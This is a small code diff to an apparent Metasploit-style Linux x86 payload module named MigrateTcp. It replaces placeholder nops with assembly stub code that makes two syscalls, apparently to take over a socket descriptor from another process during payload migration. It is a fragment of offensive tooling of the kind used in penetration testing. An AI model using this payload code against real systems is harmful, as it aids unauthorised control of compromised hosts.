@@ -28,9 +28,22 @@ module Payload::Linux::X86::MigrateTcp
   #
   def generate_stub(opts={})
     %Q^
-      nop
-      nop
-      nop
+      pop ebx
+      xor ecx, ecx
+      push 0x1b2
+      pop eax
+      int 0x80
+
+      pop ecx
+      push eax
+      pop ebx
+      xor edx, edx
+      push 0x1b6
+      pop eax
+      int 0x80
+      
+
+
     ^
   end
 
